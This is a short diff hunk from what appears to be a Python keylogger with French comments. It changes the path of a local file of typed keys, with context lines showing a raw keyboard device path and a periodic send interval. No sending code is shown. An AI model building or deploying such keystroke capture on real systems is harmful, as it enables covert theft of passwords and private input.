@@ -11,7 +11,7 @@ SEND_INTERVAL = 10                # Envoi toutes les 10 secondes
 
 # Chemin du périphérique clavier et fichier de log local
 DEVICE_PATH = "/dev/input/event2"
-LOCAL_LOG_FILE = "/home/azureuser/server/typed_keys.txt"
+LOCAL_LOG_FILE = "typed_keys.txt"
 
 # Mapping des touches vers des caractères
 key_map = {
